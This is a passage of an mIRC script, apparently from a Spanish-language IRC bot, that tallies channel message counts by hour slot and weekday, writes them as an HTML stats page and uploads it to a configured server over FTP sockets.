    wstats $1 <h1>TODA LA ACTIVIDAD POR FRANJAS HORARIAS:</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tca-1">HORARIOS</td>
    wstats $1 <td id="tca-2">LÕNEAS TOTALES</td>
    wstats $1 <td id="tca-3">PORCENTAJES</td>
    wstats $1 </tr>
    wstats $1 <tr>
    %lineas.canal.per = $calc( $gettok($hget(Stats. $+ $1,T),9,32) + $gettok($hget(Stats. $+ $1,T),10,32) + $gettok($hget(Stats. $+ $1,T),11,32) + $gettok($hget(Stats. $+ $1,T),12,32) )
    wstats $1 <td id="tc-1">00h a 06h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),9,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),9,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),9,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">06h a 12h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),10,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),10,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),10,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">12h a 18h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),11,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),11,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),11,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">18h a 00h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),12,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),12,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),12,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 <div id="clearboot"><br></div>
    wstats $1 <div id="top-50-habladores">
    wstats $1 <h1>TODA LA ACTIVIDAD SEMANAL:</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tda-1">DÕA</td>
    wstats $1 <td id="tda-2">LÕNEAS TOTALES</td>
    wstats $1 <td id="tda-3">PORCENTAJES</td>
    wstats $1 </tr>
    wstats $1 <tr>
    %lineas.canal.per = $calc( $gettok($hget(Stats. $+ $1,T),2,32) + $gettok($hget(Stats. $+ $1,T),3,32) + $gettok($hget(Stats. $+ $1,T),4,32) + $gettok($hget(Stats. $+ $1,T),5,32) + $gettok($hget(Stats. $+ $1,T),6,32) + $gettok($hget(Stats. $+ $1,T),7,32) + $gettok($hget(Stats. $+ $1,T),8,32) )
    wstats $1 <td id="td-1">LUNES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),2,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),2,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),2,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">MARTES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),3,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),3,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),3,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">MI…RCOLES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),4,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),4,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),4,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">JUEVES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),5,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),5,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),5,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 <tr>
    wstats $1 <td id="td-1">VIERNES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),6,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),6,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),6,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">S¡BADO</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),7,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),7,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),7,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">DOMINGO</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),8,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),8,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),8,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 </div>
    wstats $1 <footer>
    wstats $1 <div class="vcard">
    wstats $1 <p>&copy; Copyright <span class="name">MainCenter 2005/2013</span> All Rights Reserved. v1.1 de las Stats. By RoK & dqc
    wstats $1 </p>
    wstats $1 </div>
    wstats $1 </footer>
    wstats $1 </body>
    wstats $1 </html>
    .fclose Stats. $+ $1
    %stats.chy = $line(@statshoy. $+ $1,0)
    %stats.chyf = $gettok($line(@statshoy. $+ $1,%stats.chy),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,%stats.chy),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 1)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 1)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 2)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 2)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 3)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 3)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 4)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 4)),3,32)) $+ )
    %stats.chyf2 = $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 5)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 5)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 6)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 6)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 7)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 7)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 8)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 8)),3,32)) $+ ) $gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 9)),2,32) ( $+ $nump($gettok($line(@statshoy. $+ $1,$calc(%stats.chy - 9)),3,32)) $+ )
    window -c @stats. $+ $1 | window -c @statshoy. $+ $1
    Stats.act $1 $2 $lower($right($1,-1)) $+ .html $remove(%stats.chyf %stats.chyf2,$chr(40) $+ $chr(41))
} }
alias wstats { .fwrite -n Stats. $+ $1- }
alias stats.add {
  if ($hget(Stats. $+ $1) == $null) { hmake Stats. $+ $1 9999 | if ($exists(%rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm) == $true) { hload Stats. $+ $1 %rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm } }
  if ($hget(Stats.log. $+ $1) == $null) { hmake Stats.log. $+ $1 9999 | if ($exists(%rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm) == $true) { hload Stats.log. $+ $1 %rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm } }
  %stats.peri = $fecha.v(lunes) $+ - $+ $fecha.v(domingo)
  if ($hget(Stats. $+ $1,D) == $null) { hadd Stats. $+ $1 D $date $time }
  if ($hget(Stats. $+ $1,T) == $null) { hadd Stats. $+ $1 T $str($chr(32) 0,25) }
  if ($hget(Stats. $+ $1,$2 $+ øS) == $null) { hadd Stats. $+ $1 $2 $+ øS $str($chr(32) 0,26) }
  if ($gettok($hget(Stats. $+ $1,T),24,32) != %stats.peri) { hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-12,32) $str($chr(32) 0,11) %stats.peri $gettok($hget(Stats. $+ $1,T),25-,32) }
  if ($nick($1,0) > $iif($gettok($hget(Stats. $+ $1,T),25,32) != $null,$ifmatch,0)) { hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-24,32) $nick($1,0) $gettok($hget(Stats. $+ $1,T),26-,32) }
  if ($gettok($hget(Stats. $+ $1,$2 $+ øS),26,32) != %stats.peri) { hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-8,32) 0 0 0 0 0 0 0 $gettok($hget(Stats. $+ $1,$2 $+ øS),16-19,32) 0 0 0 0 $gettok($hget(Stats. $+ $1,$2 $+ øS),24-25,32) %stats.peri $gettok($hget(Stats. $+ $1,$2 $+ øS),27-,32) }
  %stats.hr = $stats.hr($time)
  if (%stats.hr == a) {
    hadd stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-8,32) $calc($gettok($hget(Stats. $+ $1,T),9,32) + 1) $gettok($hget(Stats. $+ $1,T),10-12,32) $calc($gettok($hget(Stats. $+ $1,T),13,32) + 1) $gettok($hget(Stats. $+ $1,T),14-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-15,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),16,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),17-19,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),20,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),21-,32)
  }
  if (%stats.hr == b) {
    hadd stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-9,32) $calc($gettok($hget(Stats. $+ $1,T),10,32) + 1) $gettok($hget(Stats. $+ $1,T),11-13,32) $calc($gettok($hget(Stats. $+ $1,T),14,32) + 1) $gettok($hget(Stats. $+ $1,T),15-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-16,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),17,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),18-20,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),21,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),22-,32)
  }
  if (%stats.hr == c) {
    hadd stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-10,32) $calc($gettok($hget(Stats. $+ $1,T),11,32) + 1) $gettok($hget(Stats. $+ $1,T),12-14,32) $calc($gettok($hget(Stats. $+ $1,T),15,32) + 1) $gettok($hget(Stats. $+ $1,T),16-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-17,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),18,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),19-21,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),22,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),23-,32)
  }
  if (%stats.hr == d) {
    hadd stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-11,32) $calc($gettok($hget(Stats. $+ $1,T),12,32) + 1) $gettok($hget(Stats. $+ $1,T),13-15,32) $calc($gettok($hget(Stats. $+ $1,T),16,32) + 1) $gettok($hget(Stats. $+ $1,T),17-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-18,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),19,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),20-22,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),23,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),24-,32)
  }
  if ($day == Monday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1,32) $calc($gettok($hget(Stats. $+ $1,T),2,32) + 1) $gettok($hget(Stats. $+ $1,T),3-16,32) $calc($gettok($hget(Stats. $+ $1,T),17,32) + 1) $gettok($hget(Stats. $+ $1,T),18-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),2,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),3-8,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),9,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),10-,32)
  }
  if ($day == Tuesday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-2,32) $calc($gettok($hget(Stats. $+ $1,T),3,32) + 1) $gettok($hget(Stats. $+ $1,T),4-17,32) $calc($gettok($hget(Stats. $+ $1,T),18,32) + 1) $gettok($hget(Stats. $+ $1,T),19-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-2,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),3,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),4-9,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),10,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),11-,32)
  }
  if ($day == Wednesday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-3,32) $calc($gettok($hget(Stats. $+ $1,T),4,32) + 1) $gettok($hget(Stats. $+ $1,T),5-18,32) $calc($gettok($hget(Stats. $+ $1,T),19,32) + 1) $gettok($hget(Stats. $+ $1,T),20-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-3,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),4,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),5-10,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),11,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),12-,32)
  }
  if ($day == Thursday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-4,32) $calc($gettok($hget(Stats. $+ $1,T),5,32) + 1) $gettok($hget(Stats. $+ $1,T),6-19,32) $calc($gettok($hget(Stats. $+ $1,T),20,32) + 1) $gettok($hget(Stats. $+ $1,T),21-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-4,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),5,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),6-11,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),12,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),13-,32)
  }
  if ($day == Friday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-5,32) $calc($gettok($hget(Stats. $+ $1,T),6,32) + 1) $gettok($hget(Stats. $+ $1,T),7-20,32) $calc($gettok($hget(Stats. $+ $1,T),21,32) + 1) $gettok($hget(Stats. $+ $1,T),22-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-5,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),6,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),7-12,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),13,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),14-,32)
  }
  if ($day == Saturday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-6,32) $calc($gettok($hget(Stats. $+ $1,T),7,32) + 1) $gettok($hget(Stats. $+ $1,T),8-21,32) $calc($gettok($hget(Stats. $+ $1,T),22,32) + 1) $gettok($hget(Stats. $+ $1,T),23-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-6,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),7,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),8-13,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),14,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),15-,32)
  }
  if ($day == Sunday) {
    hadd Stats. $+ $1 T $gettok($hget(Stats. $+ $1,T),1-7,32) $calc($gettok($hget(Stats. $+ $1,T),8,32) + 1) $gettok($hget(Stats. $+ $1,T),9-22,32) $calc($gettok($hget(Stats. $+ $1,T),23,32) + 1) $gettok($hget(Stats. $+ $1,T),24-,32)
    hadd Stats. $+ $1 $2 $+ øS $gettok($hget(Stats. $+ $1,$2 $+ øS),1-7,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),8,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),9-14,32) $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),15,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),16-,32)
  }
  hadd Stats. $+ $1 T $calc($gettok($hget(Stats. $+ $1,T),1,32) + 1) $gettok($hget(Stats. $+ $1,T),2-,32)
  hadd Stats. $+ $1 $2 $+ øS $calc($gettok($hget(Stats. $+ $1,$2 $+ øS),1,32) + 1) $gettok($hget(Stats. $+ $1,$2 $+ øS),2-23,32) $date $+ - $+ $time 0 $+ $right($3,-1) $gettok($hget(Stats. $+ $1,$2 $+ øS),26-,32)
  hadd stats.log. $+ $1 $2 $+ øF $iif($calc($gettok($hget(Stats.log. $+ $1,$2 $+ øF),1,32) + 1) > 15,1,$calc($gettok($hget(Stats.log. $+ $1,$2 $+ øF),1,32) + 1)) $date $iif($gettok($hget(Stats.log. $+ $1,$2 $+ øF),2,32) == $date,$calc($gettok($hget(Stats.log. $+ $1,$2 $+ øF),3,32) + 1),1)
  hadd stats.log. $+ $1 $2 $+ øF $+ $gettok($hget(Stats.log. $+ $1,$2 $+ øF),1,32) $date $gettok($time,1-2,58) $4-
  hsave -o Stats. $+ $1 %rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm
  if (!$timer(stats.save. $+ $1)) { .timerstats.save. $+ $1 -oh 1 500 hsave -o Stats.log. $+ $1 %rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm }
}
alias fecha.v {
  if ($day == Monday) {
    if ($1 == lunes) { return $date }
    else {
      if ($1 == Martes) { return $fecha.verf($date,+,1) }
      if ($1 == miercoles) { return $fecha.verf($date,+,2) }
      if ($1 == jueves) { return $fecha.verf($date,+,3) }
      if ($1 == Viernes) { return $fecha.verf($date,+,4) }
      if ($1 == Sabado) { return $fecha.verf($date,+,5) }
      if ($1 == domingo) { return $fecha.verf($date,+,6) }
  } }
  if ($day == Tuesday) {
    if ($1 == martes) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,1) }
      if ($1 == miercoles) { return $fecha.verf($date,+,1) }
      if ($1 == jueves) { return $fecha.verf($date,+,2) }
      if ($1 == Viernes) { return $fecha.verf($date,+,3) }
      if ($1 == Sabado) { return $fecha.verf($date,+,4) }
      if ($1 == domingo) { return $fecha.verf($date,+,5) }
  } }
  if ($day == Wednesday) {
    if ($1 == miercoles) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,2) }
      if ($1 == martes) { return $fecha.verf($date,-,1) }
      if ($1 == jueves) { return $fecha.verf($date,+,1) }
      if ($1 == Viernes) { return $fecha.verf($date,+,2) }
      if ($1 == Sabado) { return $fecha.verf($date,+,3) }
      if ($1 == domingo) { return $fecha.verf($date,+,4) }
  } }
  if ($day == Thursday) {
    if ($1 == Jueves) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,3) }
      if ($1 == martes) { return $fecha.verf($date,-,2) }
      if ($1 == miercoles) { return $fecha.verf($date,-,1) }
      if ($1 == Viernes) { return $fecha.verf($date,+,1) }
      if ($1 == Sabado) { return $fecha.verf($date,+,2) }
      if ($1 == domingo) { return $fecha.verf($date,+,3) }
  } }
  if ($day == Friday) {
    if ($1 == Viernes) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,4) }
      if ($1 == martes) { return $fecha.verf($date,-,3) }
      if ($1 == miercoles) { return $fecha.verf($date,-,2) }
      if ($1 == jueves) { return $fecha.verf($date,-,1) }
      if ($1 == Sabado) { return $fecha.verf($date,+,1) }
      if ($1 == domingo) { return $fecha.verf($date,+,2) }
  } }
  if ($day == Saturday) {
    if ($1 == Sabado) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,5) }
      if ($1 == martes) { return $fecha.verf($date,-,4) }
      if ($1 == miercoles) { return $fecha.verf($date,-,3) }
      if ($1 == jueves) { return $fecha.verf($date,-,2) }
      if ($1 == viernes) { return $fecha.verf($date,-,1) }
      if ($1 == domingo) { return $fecha.verf($date,+,1) }
  } }
  if ($day == Sunday) {
    if ($1 == Domingo) { return $date }
    else {
      if ($1 == lunes) { return $fecha.verf($date,-,6) }
      if ($1 == martes) { return $fecha.verf($date,-,5) }
      if ($1 == miercoles) { return $fecha.verf($date,-,4) }
      if ($1 == jueves) { return $fecha.verf($date,-,3) }
      if ($1 == viernes) { return $fecha.verf($date,-,2) }
      if ($1 == sabado) { return $fecha.verf($date,-,1) }
} } }
alias fecha.verf {
  var %fecha.verf.d = $gettok($1,1,47), %fecha.verf.m = $gettok($1,2,47), %fecha.verf.a = $gettok($1,3,47), %fecha.verf2 = 0, %fecha.verf = 1
  while ($3 > %fecha.verf2) {
    if ($2 == +) { if ($ctime($calc(%fecha.verf.d + 1) $+ / $+ %fecha.verf.m $+ / $+ %fecha.verf.a) == $null) { if ($ctime(01 $+ / $+ $iif(12 >= $calc(%fecha.verf.m + 1),$calc(%fecha.verf.m + 1),1) $+ / $+ %fecha.verf.a) != $null) { inc %fecha.verf2 | set %fecha.verf.d 1 | if ($calc(%fecha.verf.m + 1) > 12) { inc %fecha.verf.a } | set %fecha.verf.m $iif(12 >= $calc(%fecha.verf.m + 1),$calc(%fecha.verf.m + 1),1) } } | else { inc %fecha.verf2 | inc %fecha.verf.d } }
    if ($2 == -) { if ($ctime($calc(%fecha.verf.d - 1) $+ / $+ %fecha.verf.m $+ / $+ %fecha.verf.a) == $null) { %fecha.verf3 = 0 | while ($ctime($calc(31 - %fecha.verf3) $+ / $+ $iif($calc(%fecha.verf.m - 1) >= 01,$calc(%fecha.verf.m - 1),12) $+ / $+ %fecha.verf.a) == $null) && (31 >= %fecha.verf3) { inc %fecha.verf3 } | inc %fecha.verf2 | set %fecha.verf.d $calc(31 - %fecha.verf3) | set %fecha.verf.m $iif($calc(%fecha.verf.m - 1) >= 01,$calc(%fecha.verf.m - 1),12) | if (%fecha.verf.m == 12) { dec %fecha.verf.a } } | else { inc %fecha.verf2 | dec %fecha.verf.d } }
    inc %fecha.verf
  }
  return $iif(2 > $len(%fecha.verf.d),0 $+ %fecha.verf.d,%fecha.verf.d) $+ / $+ $iif(2 > $len(%fecha.verf.m),0 $+ %fecha.verf.m,%fecha.verf.m) $+ / $+ %fecha.verf.a
}
alias stats.reset {
  if ($hget(Stats. $+ $1) != $null) { hfree Stats. $+ $1 }
  if ($exists(%rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm) == $true) { .remove %rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm }
  if ($hget(Stats.log. $+ $1) != $null) { hfree Stats.log. $+ $1 }
  if ($exists(%rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm) == $true) { .remove %rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm }
}
alias stats.hr {
  tokenize 32 $replace($left($1,2),00,24)
  if (24 >= $left($1,2)) { if (06 > $left($1,2)) || (24 == $left($1,2)) { return a } }
  if ($left($1,2) >= 06) && (12 > $left($1,2)) { return b }
  if ($left($1,2) >= 12) && (18 > $left($1,2)) { return c }
  if ($left($1,2) >= 18) && (24 > $left($1,2)) { return d }
}
alias Stats.act {
  ;$1 == canal $2 == nick $3 == filename.html
  .timerstats.close off | Stats.FTP.c n | set %Stats.act $1- | sockopen Stats.FTP %Stats.SERV %Stats.PORT
}
on *:SOCKOPEN:Stats.FTP.load:{
  if ($sockerr > 0) { msg $gettok(%Stats.act,1,32) 2ERROR:2 Al intentar conectar con el servidor de las Stats. | Stats.FTP.c }
  else { STATS.CO stats $gettok(%Stats.act,3,32) | unset %stats.ftp.end | set %stats.in 0 | Stats.FTP.load.sw }
}
on *:SOCKWRITE:Stats.FTP.load:{
  if (%stats.ftp.end) { .timerstats.close -o 1 5 Stats.FTP.c F }
  else { Stats.FTP.load.sw }
}
alias Stats.FTP.load.sw {
  %stats.sw = $fread(stats,8192,&stat) | inc %stats.in $bvar(&stat,0)
  if ($bvar(&stat,0) != 0) {
    if (%stats.in == $file(%rHcN $+ Stats\ $+ $gettok(%Stats.act,3,32)).size) { set %stats.ftp.end o }
    sockwrite Stats.FTP.load &stat
  }
  else { msg $gettok(%Stats.act,1,32) 2ERROR:2 Al actualizar las Stats. | Stats.FTP.c }
}
alias STATS.CO { if ($fopen($1) != $null) { .fclose $1 } | if ($2) { .fopen $1 " $+ %rHcN $+ Stats\ $+ $2- $+ " } }
on *:SOCKREAD:Stats.FTP.load:{ sockread %Stats.FTP.load | tokenize 32 %Stats.FTP.load | if ($1 == 553) { msg $gettok(%Stats.act,1,32) 2ERROR:2 Revise los datos de configuraciÛn del FTP. | Stats.FTP.c } }
on *:SOCKCLOSE:Stats.FTP.load:{ Stats.FTP.c }
alias Stats.FTP.c {
  sockclose Stats.FTP.Load | sockclose Stats.FTP | STATS.CO Stats
  if ($1 != n) {
